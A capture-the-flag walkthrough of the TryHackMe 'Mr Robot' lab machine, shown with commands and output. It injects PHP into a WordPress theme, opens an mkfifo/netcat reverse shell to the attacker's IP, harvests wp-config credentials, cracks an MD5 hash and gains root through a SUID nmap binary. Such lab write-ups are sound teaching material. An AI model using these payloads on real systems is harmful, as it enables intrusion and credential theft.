# Mr Robot CTF

Based on the Mr. Robot show, can you root [this](https://tryhackme.com/room/mrrobot) box?

<center>
    <img src="https://i.imgur.com/mp5JwKO.png" width="200px">
</center>

## [Task 1] Connect to our network

### 1. Download VPN config

Hit the download link on THM.

### 2. Connect to OpenVPN

```bash
sudo openvpn your-vpn-file.ovpn
```

### 3. Verify you're connected

You can `ping` your box to check if you're connected once deployed.

### 4. Find your internal ip

You can run:
```bash
ip addr | grep tun0
```
or 
```bash
hostname -I #and it's usually the 2nd IP address along.
```

## [Task 2] Hack the machine

-----
## Recon
### Browse to Host IP
```bash
firefox 10.10.116.6 &;
```

### Pull interesting information

#### Homepage 

##### Source

###### s_code.js

`http://10.10.116.6/js/s_code.js`

- Some interesting functions in here; likely some generic dependencies.

###### main-acba06a5.js

`http://10.10.116.6/js/main-acba06a5.js`

    - Source code behind homepage; animations .etc
    - Contains some _routes_, potentially some hidden directories here.
    - May contain some info

###### Homepage inline Javascript variables

`var USER_IP='208.185.115.6';`

##### Common files

###### Robots.txt

```bash
User-agent: *
fsocity.dic     # a password dictionary
key-1-of-3.txt  # a userflag
```

###### Sitemap.xml (broken)

```xml
<parsererror xmlns="http://www.mozilla.org/newlayout/xml/parsererror.xml">
XML Parsing Error: no root element found
Location: http://10.10.116.6/sitemap.xml
Line Number 1, Column 1:
<sourcetext>
```

##### Happy path

##### `prepare`

I input the command `prepare` into the web app. It made me jump out of my skins because my headphones were on pretty loud. But, a video is played at this point.

##### Other commands

All seems to be fairly generic; lets dig into some enumeration. We may return later if there's something we've missed.

## Enumeration

### Port & Service enumeration with `nmap`

There're _3_ ports open. Notably, there're two HTTP servers, there's  potential that there may be something different on `443`. Though, unlikely.

```shell-session
kali@kali:~/Documents/hacking-notes$ nmap 10.10.116.6 -A
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-17 16:17 EDT
Nmap scan report for 10.10.116.6
Host is up (0.019s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```
#### Further enumeration

##### Navigating to `443`

`http://10.10.116.6:443/`

Returned some error about SSL; lets test `https`. And it's the same server, just over HTTPS.

### Directory enumeration with `gobuster`

Numerous findings with `gobuster`. Notably, there seems to be a WordPress blog on the server, and a number of other interesting directories.

```shell-session
kali@kali:~$ gobuster dir -u http://10.10.116.6/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.116.6/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/17 16:59:45 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/0 (Status: 301)
/Image (Status: 301)
/admin (Status: 301)
/atom (Status: 301)
/audio (Status: 301)
/blog (Status: 301)
/css (Status: 301)
/dashboard (Status: 302)
/favicon.ico (Status: 200)
/feed (Status: 301)
/images (Status: 301)
/image (Status: 301)
/index.html (Status: 200)
/index.php (Status: 301)
/intro (Status: 200)
/js (Status: 301)
/license (Status: 200)
/login (Status: 302)
/page1 (Status: 301)
/phpmyadmin (Status: 403)
/readme (Status: 200)
/rdf (Status: 301)
/robots (Status: 200)
/robots.txt (Status: 200)
/rss (Status: 301)
/rss2 (Status: 301)
/sitemap (Status: 200)
/sitemap.xml (Status: 200)
/video (Status: 301)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-includes (Status: 301)
/wp-config (Status: 200)
/wp-cron (Status: 200)
/wp-load (Status: 200)
/wp-links-opml (Status: 200)
/wp-login (Status: 200)
/wp-signup (Status: 302)
===============================================================
2020/09/17 17:01:24 Finished
===============================================================
```

#### Further enumeration post-gobuster

- __/0__

    Our first contact with the _empty_ WordPress blog.
    Seemingly no access to `/wp-json` folders that might allow user enumeration.

- __/admin__

    The browser enters a redirect loop. And seemingly doesn't have anything to glean from for the time being.

- __/license__

    This page contains some blurb about being a 'script kitty'. Fortunately, I was wise enough to inspect the source of this page and found another flag.

    ```html
    <pre>
    what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?

    do you want a password or something?

    ZWxsaW90OkVSMjgtMDY1Mgo=
    </pre>
    ```

    The password is hashed; potentially MD5 or Base 64 from intitial inspection. Lets test it with `hashid`.

    ```console
    $ hashid ZWxsaW90OkVSMjgtMDY1Mgo=
    Analyzing 'ZWxsaW90OkVSMjgtMDY1Mgo='
    [+] Unknown hash
    ```
    No luck; perhaps it's base 64 then...

    ```console
    $ echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d;
    elliot:ER28-0652
    ```
    And we find our first set of credentials.

- __/wp-links-opml__

    Here we find the _version_ of WordPress being used, `4.3.1`.

    ```xml  
    <opml version="1.0">
        <head>
            <title>Links for user's Blog!</title>
            <dateCreated>Thu, 17 Sep 2020 21:22:47 GMT</dateCreated>
            <!-- generator="WordPress/4.3.1" --><
        </head>
        <body>
        </body>
    </opml>
    ```

## Gaining access

Lets exploit the credentials found earlier:
```
elliot:ER28-0652
```
### WordPress admin login
    
The first place we should try to login is the WordPress blog. We can then exploit the admin panel to gain shell.

The credentials are accepted via `/wp-admin`.

### WordPress enumeration

I browsed around WordPress admin and restored all posts and pages; scanning the source for any clues. 

Eventually I found another _user_ `mich05654` with following details:

```
Username: mich05654
Fullname: Krista Gordon
Email: kgordon@therapist.com
```

The user `elliot` also lists their email address as `elliot@mrrobot.com`.

### Finding remote code execution vulnerability

I noticed that I edit theme and plugins in the WordPress admin panel. So in the _Twenty Twenty_ theme's `header.php` file, I inject a tester command:
```php
<?php var_dump(shell_exec('ls -lah'));?>
```
Then navigate to the earlier URL, `/0`, where the WordPress is revealed. And we see that we can execute code on the server.

As the following code is displayed:

```
string(2302) "total 7.7M drwxr-x--- 12 bitnamiftp daemon 4.0K Nov 14 2015 . drwxr-xr-x 6 root root 4.0K Sep 16 2015 .. drwxr-xr-x 7 root root 4.0K Nov 14 2015 admin drwxr-xr-x 2 root root 4.0K Nov 14 2015 audio drwxr-xr-x 2 bitnamiftp daemon 4.0K Nov 14 2015 blog drwxr-xr-x 2 root root 4.0K Nov 14 2015 css -rw-r--r-- 1 bitnamiftp daemon 7.0M Nov 13 2015 fsocity.dic drwxr-xr-x 5 root root 4.0K Nov 14 2015 images -rw-r--r-- 1 root root 1.4K Nov 14 2015 index.html -rw-r--r-- 1 bitnamiftp daemon 418 Sep 3 2015 index.php -rw-r--r-- 1 root root 505K Nov 14 2015 intro.webm drwxr-xr-x 3 root root 4.0K Nov 14 2015 js -rw-r--r-- 1 bitnamiftp daemon 33 Nov 13 2015 key-1-of-3.txt -rw-r--r-- 1 bitnamiftp daemon 20K Nov 13 2015 license.bk -rw-r--r-- 1 bitnamiftp daemon 309 Nov 13 2015 license.txt -rw-r--r-- 1 bitnamiftp daemon 64 Nov 13 2015 readme.html -rw-r--r-- 1 bitnamiftp daemon 41 Nov 13 2015 robots.txt -rw-rw-r-- 1 bitnamiftp daemon 0 Sep 16 2015 sitemap.xml -rw-rw-r-- 1 bitnamiftp daemon 0 Sep 16 2015 sitemap.xml.gz drwxr-xr-x 2 root root 4.0K Nov 14 2015 video -rw-r--r-- 1 bitnamiftp daemon 4.9K Sep 3 2015 wp-activate.php drwxr-xr-x 9 bitnamiftp daemon 4.0K Sep 16 2015 wp-admin -rw-r--r-- 1 bitnamiftp daemon 271 Sep 3 2015 wp-blog-header.php -rw-r--r-- 1 bitnamiftp daemon 4.9K Sep 3 2015 wp-comments-post.php -rwxr-x--- 1 bitnamiftp daemon 3.7K Nov 14 2015 wp-config.php drwxrwxr-x 7 bitnamiftp daemon 4.0K Nov 13 2015 wp-content -rw-r--r-- 1 bitnamiftp daemon 3.3K Sep 3 2015 wp-cron.php drwxr-xr-x 12 bitnamiftp daemon 4.0K Sep 16 2015 wp-includes -rw-r--r-- 1 bitnamiftp daemon 2.4K Sep 3 2015 wp-links-opml.php -rw-r--r-- 1 bitnamiftp daemon 3.1K Sep 3 2015 wp-load.php -rw-r--r-- 1 bitnamiftp daemon 34K Sep 3 2015 wp-login.php -rw-r--r-- 1 bitnamiftp daemon 8.1K Sep 3 2015 wp-mail.php -rw-r--r-- 1 bitnamiftp daemon 11K Sep 3 2015 wp-settings.php -rw-r--r-- 1 bitnamiftp daemon 25K Sep 3 2015 wp-signup.php -rw-r--r-- 1 bitnamiftp daemon 4.0K Sep 3 2015 wp-trackback.php -rw-r--r-- 1 bitnamiftp daemon 3.0K Sep 3 2015 xmlrpc.php -rw-r--r-- 1 bitnamiftp daemon 33 Nov 13 2015 you-will-never-guess-this-file-name.txt " 
```
 
We can assume we can execute code. 

### Obtaining reverse shell

First we need a listener running on our attacker machine

#### Run a netcat listener

`nc -lvp 4444`

#### Inject reverse netcat code into WordPress

```php
<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.8.219 4444 >/tmp/f");?>
```
After navigating to `/0` to fire the shell execution, we get shell.
```shell
kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...
10.10.116.6: inverse host lookup failed: Unknown host
connect to [10.11.8.219] from (UNKNOWN) [10.10.116.6] 40542                                                      
/bin/sh: 0: can't access tty; job control turned off                                                             
$ whoami
daemon
```

### Browsing system

#### Grabbing credentials from `wp-config.php`
MySQL credentials
```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'bitnami_wordpress');

/** MySQL database username */
define('DB_USER', 'bn_wordpress');

/** MySQL database password */
define('DB_PASSWORD', '570fd42948');

/** MySQL hostname */
define('DB_HOST', 'localhost:3306');
```

FTP credentials
```php
define('FS_METHOD', 'ftpext');
define('FTP_BASE', '/opt/bitnami/apps/wordpress/htdocs/');
define('FTP_USER', 'bitnamiftp');
define('FTP_PASS', 'inevoL7eAlBeD2b5WszPbZ2gJ971tJZtP0j86NYPyh6Wfz1x8a');
define('FTP_HOST', '127.0.0.1');
define('FTP_SSL', false);
```

#### User `robot` is found

After a little enumeration we find another user in the `/home` directory. `robot`.

#### Finding `robot`'s password file

In `/home/robot` we find a file:

```console
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

#### Cracking credentials with hashcat & earlier found password `fsocity.dic` file

First identify the hashtype; _most likely_ to be MD5.

```
kali@kali:~$ hashid c3fcd3d76192e4007dfb496cca67e13b
Analyzing 'c3fcd3d76192e4007dfb496cca67e13b'
[+] MD2
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128
[+] Haval-128
[+] Tiger-128
[+] Skein-256128)
[+] Skein-512(128)
[+] Lotus Notes/Domino 5
[+] Skype
[+] Snefru-128
[+] NTLM
[+] Domain Cached Credentials
[+] Domain Cached Credentials 2
[+] DNSSEC(NSEC3)
[+] RAdmin v2.x      
```
Then run:
```console
hashcat -a 0 -m 0 c3fcd3d76192e4007dfb496cca67e13b ~/Documents/ctf/try-hack-me/mr-robot-ctf/fsocity.dic
```

Which unfortunately fails; so instead, lets try using `rockyou.txt`.

```console
kali@kali:~/Documents/ctf/try-hack-me/mr-robot-ctf$ hashcat -a 0 -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-4690K CPU @ 3.50GHz, 2890/2954 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Time.Started.....: Thu Sep 17 18:15:43 2020 (0 secs)
Time.Estimated...: Thu Sep 17 18:15:43 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1358.9 kH/s (0.85ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 40960/14344385 (0.29%)
Rejected.........: 0/40960 (0.00%)
Restore.Point....: 36864/14344385 (0.26%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: holabebe -> loserface1

Started: Thu Sep 17 18:15:41 2020
Stopped: Thu Sep 17 18:15:45 2020
```
Which reveals `robot`'s password to be: `abcdefghijklmnopqrstuvwxyz`

### Breaking out of binary to `su` to robot

We can't run the `su` command from this current shell. So we need to 'break-out' we can do this with:
```console
$ su
su: must be run from a terminal

$ echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
$ python /tmp/asdf.py

daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ 

daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/opt/bitnami/apps/wordpress/htdocs$ cd ~
cd ~
robot@linux:~$ ls
robot@linux:~$ cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

We can also use `ssh -t`.

### Using THM's `nmap` clue we search for nmap

And we find `nmap` on the system. But notably, it has `root` privilege.

`nmap` can be used to spawn an _interactive shell system_, [check out GTFObins](https://gtfobins.github.io/gtfobins/nmap/).

```shell
daemon@linux:/usr/local/bin$ ./nmap 

Starting nmap 3.81 ( http://www.insecure.org/nmap/ ) at 2020-09-18 21:43 UTC
Failed to resolve given hostname/IP: interactive.  Note that you can't use '/mask' AND '[1-4,7,100-]' style IP ranges
WARNING: No targets were specified, so 0 hosts scanned.
Nmap finished: 0 IP addresses (0 hosts up) scanned in 0.183 seconds

daemon@linux:/usr/local/bin$ ls -lah
ls -lah
total 504K
drwxr-xr-x  2 root root 4.0K Nov 13  2015 .
drwxr-xr-x 10 root root 4.0K Jun 24  2015 ..
-rwsr-xr-x  1 root root 493K Nov 13  2015 nmap

daemon@linux:/usr/local/bin$ ./nmap --interactive
./nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
# ls /root     
ls /root
firstboot_done key-3-of-3.txt
whoami
root
# cat /root/key-3-of-3.txt
cat /root/key-3-of-3.txt     
```
